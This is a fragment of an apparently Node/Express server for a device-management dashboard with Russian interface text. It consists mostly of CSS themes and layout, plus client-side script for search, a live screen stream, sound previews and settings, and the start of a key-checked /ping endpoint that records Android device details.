/* ── tiles ── */
.tiles{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:12px;margin-bottom:16px}
.tile{
  border:1px solid var(--line);border-radius:12px;background:var(--panel);
  padding:15px 16px;position:relative;overflow:hidden;transition:border-color .16s;
}
.tile:hover{border-color:var(--line-2)}
.tile::after{
  content:'';position:absolute;inset:0;pointer-events:none;
  background:linear-gradient(180deg,var(--wash),transparent 60%);opacity:.6;
}
.tile-head{display:flex;align-items:center;justify-content:space-between;color:var(--fg-3);margin-bottom:10px}
.tile-head .ico{width:16px;height:16px;opacity:.75}
.tile-label{font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;font-weight:600}
.tile-value{font-size:26px;font-weight:700;letter-spacing:-.03em;color:var(--strong);font-variant-numeric:tabular-nums;line-height:1.1}
.tile-unit{font-size:12px;font-weight:500;color:var(--fg-3);margin-left:8px;letter-spacing:0}
.tile-foot{margin-top:6px;font-size:11.5px;color:var(--fg-3)}

/* ── panels ── */
.panel{border:1px solid var(--line);border-radius:12px;background:var(--panel);overflow:hidden}
.panel-pad{padding:4px;margin-bottom:24px}
.panel-head{
  display:flex;align-items:center;justify-content:space-between;gap:12px;
  padding:14px 16px;border-bottom:1px solid var(--line);
}
.panel-head h2{margin:0;font-size:12.5px;font-weight:600;color:var(--fg-2);letter-spacing:.02em}
.panel-hint{font-size:11px;color:var(--fg-3)}
.link{font-size:12px;color:var(--fg-2);font-weight:600}
.link:hover{color:var(--accent)}
.split{display:grid;grid-template-columns:1.6fr 1fr;gap:12px;margin-bottom:16px}

/* ── chart ── */
.chart{display:flex;align-items:flex-end;gap:6px;height:180px;padding:20px 16px 10px;border-bottom:1px solid var(--row-line);background-image:repeating-linear-gradient(to top,var(--row-line) 0 1px,transparent 1px 45px)}
.bar-col{flex:1;display:flex;flex-direction:column;justify-content:flex-end;align-items:center;height:100%;gap:8px;min-width:0}
.bar{
  width:100%;max-width:26px;border-radius:5px 5px 2px 2px;background:var(--accent);opacity:.85;
  transition:opacity .15s,transform .15s;min-height:3px;
}
.bar-col:hover .bar{opacity:1;transform:scaleY(1.02)}
.bar.is-zero{background:var(--line-2);opacity:.5}
.bar-label{font-size:9.5px;color:var(--fg-3);font-variant-numeric:tabular-nums;white-space:nowrap}

/* ── feed ── */
.feed{list-style:none;margin:0;padding:4px 0}
.feed-item{display:flex;align-items:center;gap:12px;padding:10px 16px;border-bottom:1px solid var(--row-line)}
.feed-item:last-child{border-bottom:0}
.feed-dot{width:7px;height:7px;border-radius:50%;background:var(--line-2);flex:none}
.feed-dot.is-ok{background:var(--accent);box-shadow:0 0 8px var(--accent)}
.feed-dot.is-bad{background:#f2555a}
.feed-dot.is-cmd{background:var(--fg-2)}
.feed-main{flex:1;min-width:0}
.feed-title{font-size:12.5px;color:var(--fg);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.feed-title b{font-weight:600}
.feed-sub{display:flex;align-items:center;gap:8px;margin-top:3px;font-size:11.5px;color:var(--fg-3)}
.feed-note{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:340px;font-style:italic}
.feed-time{font-size:11px;color:var(--fg-3);font-variant-numeric:tabular-nums}

.mini-list{padding:6px}
.mini-row{display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:8px;transition:background .14s}
.mini-row:hover{background:var(--hover)}
.mini-main{flex:1;min-width:0}
.mini-main b{display:block;font-size:12.5px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.mini-main small{display:block;font-size:11px;color:var(--fg-3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.mini-empty{padding:22px;text-align:center;font-size:12px;color:var(--fg-3)}

/* ── table ── */
.table-wrap{border:1px solid var(--line);border-radius:12px;background:var(--panel);overflow:auto;max-height:calc(100vh - 240px)}
table{width:100%;border-collapse:separate;border-spacing:0}
thead th{
  position:sticky;top:0;z-index:2;text-align:left;
  padding:10px 14px;font-size:10px;letter-spacing:.12em;text-transform:uppercase;
  color:var(--fg-3);font-weight:600;background:var(--thead);
  border-bottom:1px solid var(--line);white-space:nowrap;
}
tbody td{padding:11px 14px;border-bottom:1px solid var(--row-line);vertical-align:middle;font-size:12.5px}
tbody tr:last-child td{border-bottom:0}
tbody tr{transition:background .1s}
tbody tr:hover{background:var(--hover)}
.is-striped tbody tr:nth-child(even){background:var(--zebra)}
.is-striped tbody tr:nth-child(even):hover{background:var(--hover)}
td.right .btn+.btn{margin-left:6px}
.note{max-width:520px}
.sub{margin-top:5px;font-size:11.5px;color:var(--fg-2)}
.cell-device{display:flex;align-items:center;gap:9px;min-width:0}
.cell-device span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.avatar{
  width:26px;height:26px;border-radius:8px;display:grid;place-items:center;flex:none;
  border:1px solid var(--line-2);background:var(--hover);
  font-size:11.5px;font-weight:700;color:var(--fg);text-transform:uppercase;
}
.thumb{margin-top:8px}
.thumb img{max-width:260px;border-radius:8px;border:1px solid var(--line-2);display:block;cursor:zoom-in;transition:border-color .15s}
.thumb img:hover{border-color:var(--accent)}

/* ── bits ── */
.pill{
  display:inline-flex;align-items:center;height:19px;padding:0 7px;border-radius:6px;
  font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;
  border:1px solid var(--line-2);color:var(--fg-2);vertical-align:middle;
}
.pill.is-ok{background:var(--accent);border-color:var(--accent);color:var(--accent-fg)}
.pill.is-bad{color:#f2555a;border-color:#f2555a55;background:#f2555a12}
.tag{
  display:inline-flex;align-items:center;height:19px;padding:0 7px;margin-right:5px;border-radius:5px;
  border:1px solid var(--line);color:var(--fg-2);font-family:ui-monospace,Menlo,monospace;font-size:10.5px;
  vertical-align:middle;
}
.chip{font-size:11px;color:var(--fg-2);border:1px solid var(--line);border-radius:5px;padding:2px 7px}
.dot{width:7px;height:7px;border-radius:50%;background:var(--line-2);flex:none}
.dot.is-on{background:var(--accent);box-shadow:0 0 0 3px color-mix(in srgb,var(--accent) 18%,transparent)}
.progress{height:4px;border-radius:99px;background:var(--line);margin-top:8px;max-width:220px;overflow:hidden}
.progress span{display:block;height:100%;background:var(--accent);border-radius:99px}

/* ── pager ── */
.pager{display:flex;align-items:center;gap:4px;margin-top:14px;flex-wrap:wrap}
.pg{
  min-width:30px;height:30px;display:inline-grid;place-items:center;padding:0 8px;border-radius:7px;
  border:1px solid var(--line);font-size:12px;color:var(--fg-2);font-variant-numeric:tabular-nums;
  transition:all .13s;
}
.pg:hover{border-color:var(--line-2);color:var(--fg)}
.pg.is-active{background:var(--accent);color:var(--accent-fg);border-color:var(--accent);font-weight:600}
.pg.is-dots{border-color:transparent;color:var(--fg-3)}
.pager-info{margin-left:auto;font-size:11.5px;color:var(--fg-3)}

/* ── empty ── */
.empty{
  border:1px solid var(--line);border-radius:12px;background:var(--panel);
  padding:64px 24px;text-align:center;color:var(--fg-3);
}
.empty-ico{width:34px;height:34px;margin:0 auto 14px;color:var(--fg-3);opacity:.6}
.empty h3{margin:0 0 6px;font-size:14px;color:var(--fg);font-weight:600}
.empty p{margin:0;font-size:12.5px}
.empty code{background:var(--hover);padding:1px 5px;border-radius:4px;border:1px solid var(--line)}

/* ── devices ── */
.dev-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:12px}
.dev-card{
  display:flex;flex-direction:column;gap:12px;padding:14px;border-radius:12px;
  border:1px solid var(--line);background:var(--panel);
  transition:border-color .16s,background .16s,transform .16s;
}
.dev-card:hover{border-color:var(--line-2);background:var(--hover);transform:translateY(-2px)}
.dev-top{display:flex;align-items:center;gap:10px}
.dev-name{flex:1;min-width:0}
.dev-name b{display:block;font-size:13px;font-weight:600;color:var(--strong);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dev-name small{display:block;font-size:10.5px;color:var(--fg-3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dev-meta{display:flex;justify-content:space-between;gap:10px;font-size:11.5px;color:var(--fg-3)}
.dev-foot{display:flex;align-items:center;justify-content:space-between;gap:10px}

.back{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:600;color:var(--fg-2);margin-bottom:16px}
.back:hover{color:var(--accent)}
.back .ico{width:15px;height:15px}
.dev-hero{
  display:flex;align-items:center;gap:14px;padding:16px;margin-bottom:16px;
  border:1px solid var(--line);border-radius:12px;background:var(--panel);
}
.dev-hero .avatar{width:44px;height:44px;border-radius:12px;font-size:16px}
.dev-hero-main{flex:1;min-width:0}
.dev-hero h2{margin:0;font-size:17px;font-weight:700;color:var(--strong);letter-spacing:-.01em}
.dev-hero-sub{margin-top:3px;font-size:11.5px;color:var(--fg-3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.cmd-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:10px;margin-bottom:18px}
.cmd-card{
  display:flex;flex-direction:column;gap:6px;padding:14px;border-radius:11px;
  border:1px solid var(--line);background:var(--panel);transition:all .16s;
}
.cmd-card .ico{width:17px;height:17px;color:var(--fg-3)}
.cmd-card span{font-size:13px;font-weight:600;color:var(--fg)}
.cmd-card small{font-size:10.5px;color:var(--fg-3);font-family:ui-monospace,Menlo,monospace}
.cmd-card:hover{border-color:var(--accent);background:var(--hover);transform:translateY(-2px)}
.cmd-card:hover .ico{color:var(--accent)}

/* ── картинка на экран ── */
.img-panel{margin-bottom:16px}
.img-upload{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:0 0 14px}
.img-upload input[type=file]{
  flex:1;min-width:200px;font-size:12px;color:var(--fg-3);padding:7px 10px;
  border:1px solid var(--line);border-radius:9px;background:var(--panel-2,var(--panel));
}
.img-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(148px,1fr));gap:10px}
.img-cell{border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--panel)}
.img-cell img{display:block;width:100%;height:104px;object-fit:cover;background:#000}
.img-meta{padding:6px 8px;font-size:10.5px;color:var(--fg-3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.img-actions{display:flex;gap:6px;padding:0 8px 8px}
.panel-foot{display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:space-between;margin-top:14px}
.empty.sm{padding:14px;font-size:12px}

/* ── settings ── */
.settings{max-width:860px}
.block-title{font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--fg-3);font-weight:600;margin:0 0 10px}
.theme-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap:10px;margin-bottom:24px}
.theme-card{
  display:flex;align-items:center;gap:10px;padding:12px;border-radius:10px;cursor:pointer;
  border:1px solid var(--line);background:var(--panel);transition:all .15s;
}
.theme-card:hover{border-color:var(--line-2)}
.theme-card.is-active{border-color:var(--accent);box-shadow:inset 0 0 0 1px var(--accent)}
.theme-card input{display:none}
.theme-dots{display:flex;gap:3px}
.theme-dots i{width:11px;height:11px;border-radius:50%;display:block;border:1px solid #00000022}
.theme-name{font-size:12.5px;font-weight:600;flex:1}
.theme-check .ico{width:15px;height:15px;color:var(--accent)}
.set-row{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:12px 16px;border-bottom:1px solid var(--row-line);flex-wrap:wrap}
.panel-pad .set-row:last-child{border-bottom:0}
.switch-row{display:flex;align-items:center;gap:14px;padding:12px 16px;border-bottom:1px solid var(--row-line);cursor:pointer}
.panel-pad .switch-row:last-child{border-bottom:0}
.switch-text{display:flex;flex-direction:column;gap:2px;flex:1;min-width:170px}
.switch-text b{font-size:12.5px;font-weight:600;color:var(--fg)}
.switch-text small{font-size:11.5px;color:var(--fg-3)}
.switch-row input{display:none}
.switch{
  width:38px;height:22px;border-radius:99px;border:1px solid var(--line-2);background:var(--hover);
  position:relative;flex:none;transition:background .16s,border-color .16s;
}
.switch::after{
  content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;
  background:var(--fg-2);transition:transform .16s,background .16s;
}
.switch-row input:checked+.switch{background:var(--accent);border-color:var(--accent)}
.switch-row input:checked+.switch::after{transform:translateX(16px);background:var(--accent-fg)}
.seg{display:inline-flex;border:1px solid var(--line);border-radius:8px;overflow:hidden;background:var(--bg-2)}
.seg-item{padding:6px 11px;font-size:11.5px;font-weight:600;color:var(--fg-2);cursor:pointer;border-right:1px solid var(--line);transition:all .13s}
.seg-item:last-child{border-right:0}
.seg-item:hover{color:var(--fg)}
.seg-item input{display:none}
.seg-item.is-active{background:var(--accent);color:var(--accent-fg)}
.set-actions{display:flex;align-items:center;gap:10px;margin-top:18px}
.set-actions .faint{margin-left:auto;font-size:11px}
.toast{
  display:flex;align-items:center;gap:8px;max-width:860px;margin-bottom:18px;
  padding:10px 14px;border-radius:9px;border:1px solid var(--accent);
  color:var(--accent);background:var(--hover);font-size:12.5px;font-weight:600;
}
.toast .ico{width:15px;height:15px}

/* ── palette ── */
.palette{
  position:fixed;inset:0;z-index:100;display:none;justify-content:center;align-items:flex-start;
  padding-top:14vh;background:#00000080;backdrop-filter:blur(3px);
}
.palette.is-open{display:flex}
.pal-box{width:min(560px,92vw);border:1px solid var(--line-2);border-radius:14px;background:var(--panel);overflow:hidden;box-shadow:0 30px 80px -20px #000}
.pal-input{display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid var(--line)}
.pal-input input{border:0;background:transparent;outline:none;color:var(--fg);font:inherit;font-size:14px;flex:1}
.pal-input .ico{color:var(--fg-3);width:16px;height:16px}
.pal-list{max-height:320px;overflow:auto;padding:6px}
.pal-item{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:9px 11px;border-radius:8px;font-size:13px}
.pal-item:hover,.pal-item.is-sel{background:var(--hover)}
.pal-hint{font-size:11px;color:var(--fg-3)}

.panel-actions{display:flex;align-items:center;gap:8px}
.sound-panel{margin-bottom:16px}
.sound-form{display:flex;align-items:center;gap:8px;padding:14px 16px;flex-wrap:wrap}
.sound-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:8px;padding:0 16px 16px}
.sound-item{
  display:flex;align-items:center;gap:8px;text-align:left;cursor:pointer;
  padding:9px 11px;border-radius:8px;border:1px solid var(--line-2);
  background:var(--panel);color:var(--fg);font:600 12px/1.2 inherit;min-width:0;
}
.sound-item:hover{background:var(--hover);border-color:var(--fg-3)}
.sound-item.is-away{opacity:.6}
.sound-item.is-on{background:var(--hover);border-color:var(--fg-3)}
.sound-play{color:var(--fg-3);font-size:11px;flex:0 0 auto}
.sound-item.is-on .sound-play{color:var(--fg)}
.sound-name{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:0}
.sound-tag{font-size:10px;color:var(--fg-3);border:1px solid var(--line-2);border-radius:99px;padding:2px 6px;flex:0 0 auto}
.select{
  appearance:none;height:34px;padding:0 32px 0 12px;border-radius:8px;
  border:1px solid var(--line-2);background:var(--panel);color:var(--fg);
  font:600 12.5px/1 inherit;cursor:pointer;min-width:200px;
  background-image:linear-gradient(45deg,transparent 50%,var(--fg-3) 50%),linear-gradient(135deg,var(--fg-3) 50%,transparent 50%);
  background-position:calc(100% - 16px) 14px,calc(100% - 11px) 14px;
  background-size:5px 5px,5px 5px;background-repeat:no-repeat;
}
.select:focus{outline:none;border-color:var(--fg-3)}
.screen-wrap{background:#000;display:flex;align-items:center;justify-content:center;min-height:320px;max-height:calc(100vh - 300px)}
.screen{display:block;max-width:100%;max-height:calc(100vh - 300px);object-fit:contain;background:#000}
.screen-hint{margin:12px 2px 0;font-size:11.5px;color:var(--fg-3)}

/* ── settings layout ── */
.settings-cols{display:grid;grid-template-columns:1fr 1fr;gap:20px;align-items:start;margin-bottom:20px}
.settings-cols>div>.panel-pad{margin-bottom:0}
.preview{border:1px dashed var(--line-2);border-radius:12px;padding:12px 14px;margin-bottom:22px;max-width:420px;background:var(--panel)}
.preview-head{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--fg-3);margin-bottom:8px}
.preview-row{display:flex;align-items:center;gap:9px;padding:6px 0;font-size:12.5px}
.preview-row b{flex:1;font-weight:600}
.preview-pill{font-size:10.5px;border:1px solid var(--line-2);border-radius:5px;padding:1px 6px;color:var(--fg-2)}

/* ── user toggles ── */
.is-rail-compact .rail{width:78px;padding:16px 10px}
.is-rail-compact .brand-text,
.is-rail-compact .nav-label,
.is-rail-compact .nav-count{display:none}
.is-rail-compact .nav-item{justify-content:center}
.is-rail-compact .brand{justify-content:center;padding:4px 0 16px}
.is-rail-compact .rail-foot .stat{display:none}
.is-rail-compact .theme-row{flex-wrap:wrap;justify-content:center;gap:6px}
.is-mono-tables tbody td{font-family:ui-monospace,SFMono-Regular,'JetBrains Mono',Menlo,Consolas,monospace;font-size:calc(var(--fs) - 1.5px)}
.is-no-borders tbody td{border-bottom-color:transparent}
body.is-flat::after{display:none}
.split.is-single{grid-template-columns:1fr}

/* ── polish ── */
@keyframes fadeUp{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
.tile,.panel,.dev-card,.empty,.toast{animation:fadeUp .28s ease both}
.tile:nth-child(2){animation-delay:.03s}
.tile:nth-child(3){animation-delay:.06s}
.tile:nth-child(4){animation-delay:.09s}
tbody tr:hover{box-shadow:inset 2px 0 0 var(--accent)}
.nav-item.is-active .ico{transform:scale(1.05)}
.nav-item .ico{transition:transform .15s}
@media (max-width:1100px){.settings-cols{grid-template-columns:1fr}}

/* ── density ── */
.is-dense tbody td{padding:7px 12px}
.is-dense thead th{padding:8px 12px}
.is-dense .feed-item{padding:7px 14px}
.is-dense .dev-card{padding:11px 12px}

/* ── themes ── */
body{
  --fs:14px;--wash:rgba(255,255,255,.05);--hover:rgba(255,255,255,.05);
  --zebra:rgba(255,255,255,.02);
}
body.t-mono{
  --bg:#0a0a0a;--bg-2:#0d0d0d;--panel:#121212;--thead:#0e0e0e;
  --line:#1f1f1f;--line-2:#303030;--row-line:#191919;
  --fg:#ececec;--fg-2:#9b9b9b;--fg-3:#6b6b6b;--strong:#fff;
  --accent:#ffffff;--accent-fg:#0a0a0a;
}
body.t-graphite{
  --bg:#151515;--bg-2:#191919;--panel:#1e1e1e;--thead:#171717;
  --line:#2a2a2a;--line-2:#3c3c3c;--row-line:#242424;
  --fg:#dedede;--fg-2:#9e9e9e;--fg-3:#757575;--strong:#f7f7f7;
  --accent:#dcdcdc;--accent-fg:#151515;--wash:rgba(255,255,255,.045);
}
body.t-slate{
  --bg:#0b0f14;--bg-2:#0e131a;--panel:#121821;--thead:#0d1218;
  --line:#1c2530;--line-2:#2c3947;--row-line:#161e27;
  --fg:#e3e9f0;--fg-2:#93a1b2;--fg-3:#68798c;--strong:#fff;
  --accent:#94a3b8;--accent-fg:#0b0f14;
  --wash:rgba(148,163,184,.09);--hover:rgba(148,163,184,.07);--zebra:rgba(148,163,184,.03);
}
body.t-paper{
  --bg:#f6f6f3;--bg-2:#f0f0ec;--panel:#fff;--thead:#fafaf7;
  --line:#e3e3dd;--line-2:#cdcdc6;--row-line:#eeeeea;
  --fg:#191917;--fg-2:#5b5b55;--fg-3:#8a8a83;--strong:#000;
  --accent:#111;--accent-fg:#fff;
  --wash:rgba(0,0,0,.035);--hover:rgba(0,0,0,.04);--zebra:rgba(0,0,0,.018);
}
body.t-terminal{
  --bg:#050906;--bg-2:#080e0a;--panel:#0c1410;--thead:#070d09;
  --line:#17291d;--line-2:#24432f;--row-line:#122018;
  --fg:#d8f6e3;--fg-2:#7fb090;--fg-3:#557a63;--strong:#eafff3;
  --accent:#4ade80;--accent-fg:#04150a;
  --wash:rgba(74,222,128,.08);--hover:rgba(74,222,128,.07);--zebra:rgba(74,222,128,.026);
}
body.t-amber{
  --bg:#0b0906;--bg-2:#100d08;--panel:#15110a;--thead:#0d0a06;
  --line:#2a2317;--line-2:#463a24;--row-line:#221c12;
  --fg:#f6ebd7;--fg-2:#b7a482;--fg-3:#84765c;--strong:#fff7e6;
  --accent:#f0b429;--accent-fg:#160f02;
  --wash:rgba(240,180,41,.08);--hover:rgba(240,180,41,.06);--zebra:rgba(240,180,41,.024);
}
body.t-crimson{
  --bg:#0c0708;--bg-2:#110a0b;--panel:#170d0f;--thead:#0e0809;
  --line:#2c1a1e;--line-2:#47282e;--row-line:#231316;
  --fg:#f8eaeb;--fg-2:#be9ca0;--fg-3:#8b6d71;--strong:#fff3f4;
  --accent:#e8556b;--accent-fg:#1a0508;
  --wash:rgba(232,85,107,.09);--hover:rgba(232,85,107,.07);--zebra:rgba(232,85,107,.026);
}

/* ── responsive ── */
@media (max-width:1100px){
  .split{grid-template-columns:1fr}
}
@media (max-width:880px){
  .shell{flex-direction:column}
  .rail{
    width:auto;height:auto;position:static;flex-direction:row;align-items:center;gap:8px;
    padding:10px 12px;border-right:0;border-bottom:1px solid var(--line);overflow-x:auto;
  }
  .brand{padding:0 8px 0 0}
  .brand-text{display:none}
  .nav{flex-direction:row;gap:4px;margin:0}
  .nav-item{padding:8px 10px}
  .nav-label{display:none}
  .nav-count{display:none}
  .rail-foot{display:none}
  .topbar{padding:14px 16px}
  .content{padding:16px 16px 56px}
  .table-wrap{max-height:none}
  table{min-width:680px}
  .search{min-width:0;flex:1}
  .toolbar{flex-wrap:wrap}
}
</style></head>
<body class="${bodyClass}" style="--fs:${S.fontSize}px"${S.autoRefresh ? ` data-autoref="${S.autoRefresh}"` : ''}${req.query.sent ? ' data-watch="3"' : ''}${tab === 'screen' && selectedDevice ? ` data-screen="${esc(selectedDevice)}" data-key="${k}"` : ''}>
<div class="shell">
  <aside class="rail">
    <div class="brand">
      <div class="brand-mark">◆</div>
      <div class="brand-text"><b>PANEL</b><small>control surface</small></div>
    </div>
    <nav class="nav">${navHtml}</nav>
    <div class="rail-foot">
      <div class="stat" data-live="stat"><b>${deviceList.length}</b> устройств · <b>${onlineCount}</b> online</div>
      <div class="theme-row">${themeDots}</div>
    </div>
  </aside>

  <main class="main">
    <div class="topbar">
      <div class="topbar-title">
        <h1>${TITLES[tab]}</h1>
        <p>${SUBTITLES[tab]}</p>
      </div>
      <div class="topbar-actions">
        <button class="btn btn-ghost" data-palette-open>${icon('search')}<span>Поиск</span><kbd class="kbd">⌘K</kbd></button>
      </div>
    </div>

    <div class="content">
      ${toolbar}
      ${body}
    </div>
  </main>
</div>

<div class="palette" data-palette>
  <div class="pal-box">
    <div class="pal-input">${icon('search')}<input data-pal-input placeholder="Раздел, устройство, id…" autocomplete="off"/><kbd class="kbd">esc</kbd></div>
    <div class="pal-list" data-pal-list>${paletteHtml}</div>
  </div>
</div>

<script>
(function(){
  var search = document.querySelector('[data-search]');
  if (search) {
    search.addEventListener('input', function(){
      var q = search.value.toLowerCase();
      var rows = document.querySelectorAll('tbody tr');
      for (var i = 0; i < rows.length; i++) {
        rows[i].style.display = rows[i].textContent.toLowerCase().indexOf(q) > -1 ? '' : 'none';
      }
    });
  }

  var live = document.querySelector('[data-stream]');
  if (live) {
    // поток MJPEG никогда не «завершается», поэтому ставим src после загрузки документа
    setTimeout(function(){
      live.src = live.getAttribute('data-stream');
    }, 50);
    live.addEventListener('error', function(){
      setTimeout(function(){
        live.src = live.getAttribute('data-stream') + '&r=' + Date.now();
      }, 2000);
    });
  }

  var scr = document.body.getAttribute('data-screen');
  if (scr) {
    var scrKey = document.body.getAttribute('data-key') || '';
    window.addEventListener('pagehide', function(){
      try {
        navigator.sendBeacon('/stream/stop?key=' + encodeURIComponent(scrKey) + '&device=' + encodeURIComponent(scr));
      } catch (e) {}
    });
  }

  var form = document.querySelector('[data-settings-form]');
  if (form) {
    var sync = function(){
      var b = document.body;
      var theme = form.querySelector('input[name="theme"]:checked');
      if (theme) {
        var cls = Array.prototype.slice.call(b.classList).filter(function(c){ return c.indexOf('t-') === 0; });
        cls.forEach(function(c){ b.classList.remove(c); });
        b.classList.add('t-' + theme.value);
        var dots = document.querySelectorAll('.theme-card');
        for (var i = 0; i < dots.length; i++) {
          var input = dots[i].querySelector('input');
          dots[i].classList.toggle('is-active', input && input.checked);
        }
      }
      var dense = form.querySelector('input[name="density"]:checked');
      if (dense) b.classList.toggle('is-dense', dense.value === 'dense');

      var fs = form.querySelector('input[name="fontSize"]:checked');
      if (fs) b.style.setProperty('--fs', fs.value + 'px');

      var flag = function(name, cls, invert){
        var el = form.querySelector('input[type="checkbox"][name="' + name + '"]');
        if (!el) return;
        var on = invert ? !el.checked : el.checked;
        b.classList.toggle(cls, on);
      };
      flag('striped', 'is-striped', false);
      flag('monoTables', 'is-mono-tables', false);
      flag('railCompact', 'is-rail-compact', false);
      flag('tableBorders', 'is-no-borders', true);
      flag('glow', 'is-flat', true);

      var segs = form.querySelectorAll('.seg');
      for (var s = 0; s < segs.length; s++) {
        var items = segs[s].querySelectorAll('.seg-item');
        for (var k = 0; k < items.length; k++) {
          var r = items[k].querySelector('input');
          items[k].classList.toggle('is-active', r && r.checked);
        }
      }
    };
    form.addEventListener('change', sync);
    form.addEventListener('input', sync);
  }

  var watch = document.body.getAttribute('data-watch');
  if (watch) {
    var w = parseInt(watch, 10);
    var wkey = 'watch:' + location.pathname + location.search;
    var wn = parseInt(sessionStorage.getItem(wkey) || '0', 10);
    if (w > 0 && wn < 10) {
      sessionStorage.setItem(wkey, String(wn + 1));
      setTimeout(function(){ location.reload(); }, w * 1000);
    } else {
      sessionStorage.removeItem(wkey);
    }
  }

  var auto = document.body.getAttribute('data-autoref');
  if (auto) {
    var t = parseInt(auto, 10);
    if (t > 0) setInterval(function(){ if (document.hasFocus()) location.reload(); }, t * 1000);
  }

  // ── живое обновление обзора: без перезагрузки, стрим и скролл не рвутся ──
  var liveBox = document.querySelector('[data-live="overview"]');
  if (liveBox) {
    var liveLast = {};
    var liveBusy = false;
    var liveTick = function(){
      if (liveBusy || document.visibilityState !== 'visible') return;
      liveBusy = true;
      fetch('/api/state', { credentials: 'same-origin', cache: 'no-store' })
        .then(function(r){ return r.ok ? r.json() : null; })
        .then(function(d){
          if (!d || !d.ok) return;
          var boxes = { overview: d.overview, stat: d.stat };
          for (var key in boxes) {
            if (typeof boxes[key] !== 'string' || liveLast[key] === boxes[key]) continue;
            var el = document.querySelector('[data-live="' + key + '"]');
            if (el) { el.innerHTML = boxes[key]; liveLast[key] = boxes[key]; }
          }
          if (d.counts) {
            for (var id in d.counts) {
              var c = document.querySelector('[data-count="' + id + '"]');
              if (!c) continue;
              c.textContent = d.counts[id] ? String(d.counts[id]) : '';
              c.style.display = d.counts[id] ? '' : 'none';
            }
          }
        })
        .catch(function(){})
        .then(function(){ liveBusy = false; });
    };
    setInterval(liveTick, 5000);
    document.addEventListener('visibilitychange', function(){
      if (document.visibilityState === 'visible') liveTick();
    });
  }

  // ── прослушивание звуков прямо в панели ──
  (function(){
    var snd = document.getElementById('snd-preview');

    function mark(name){
      var items = document.querySelectorAll('.sound-item');
      for (var i = 0; i < items.length; i++) {
        items[i].classList.toggle('is-on', name && items[i].getAttribute('data-preview') === name);
      }
    }

    function play(name){
      if (!name) return;
      if (!snd) {
        snd = new Audio();
        snd.id = 'snd-preview';
        document.body.appendChild(snd);
      }
      snd.src = '/sounds/' + encodeURIComponent(name) + '.mp3';
      var p = snd.play();
      if (p && p.catch) p.catch(function(){});
      mark(name);
    }

    document.addEventListener('click', function(e){
      var el = e.target.closest ? e.target.closest('[data-preview]') : null;
      if (el) {
        if (el.getAttribute('data-nofile')) return;   // файла нет на сервере
        play(el.getAttribute('data-preview'));
        return;
      }
      var btn = e.target.closest ? e.target.closest('#snd-play-sel') : null;
      if (btn) {
        var sel = document.querySelector('.sound-form select[name="name"]');
        if (sel) play(sel.value);
      }
    });

    if (snd) {
      snd.addEventListener('ended', function(){ mark(null); });
      snd.addEventListener('pause', function(){ if (snd.ended) mark(null); });
    }
  })();

  var palette = document.querySelector('[data-palette]');
  var palInput = document.querySelector('[data-pal-input]');
  var listeners = document.querySelectorAll('[data-palette-open]');

  function openPal(){
    if (!palette) return;
    palette.classList.add('is-open');
    if (palInput) { palInput.value = ''; filter(''); palInput.focus(); }
  }
  function closePal(){ if (palette) palette.classList.remove('is-open'); }
  function filter(q){
    q = (q || '').toLowerCase();
    var items = document.querySelectorAll('[data-pal]');
    var first = null;
    for (var i = 0; i < items.length; i++) {
      var hit = items[i].textContent.toLowerCase().indexOf(q) > -1;
      items[i].style.display = hit ? '' : 'none';
      items[i].classList.remove('is-sel');
      if (hit && !first) first = items[i];
    }
    if (first) first.classList.add('is-sel');
  }

  for (var i = 0; i < listeners.length; i++) listeners[i].addEventListener('click', openPal);
  if (palette) palette.addEventListener('click', function(e){ if (e.target === palette) closePal(); });
  if (palInput) palInput.addEventListener('input', function(){ filter(palInput.value); });

  document.addEventListener('keydown', function(e){
    if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); openPal(); return; }
    if (e.key === 'Escape') { closePal(); return; }
    if (e.key === '/' && document.activeElement !== search && document.activeElement.tagName !== 'INPUT') {
      if (search) { e.preventDefault(); search.focus(); }
    }
    if (e.key === 'Enter' && palette && palette.classList.contains('is-open')) {
      var sel = document.querySelector('[data-pal].is-sel');
      if (sel) location.href = sel.getAttribute('href');
    }
  });
})();
</script>
</body></html>`;

  res.setHeader('Cache-Control', 'no-store');
  res.type('html').send(html);
});

app.post('/ping', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const deviceId = data.deviceId || ip;
  const devices = readDevices();
  const prev = devices[deviceId] || {};

  devices[deviceId] = {
    ...prev,
    deviceId,
    device: data.device || prev.device || '?',
    android: data.android || prev.android || '?',
    sdk: data.sdk || prev.sdk || '?',
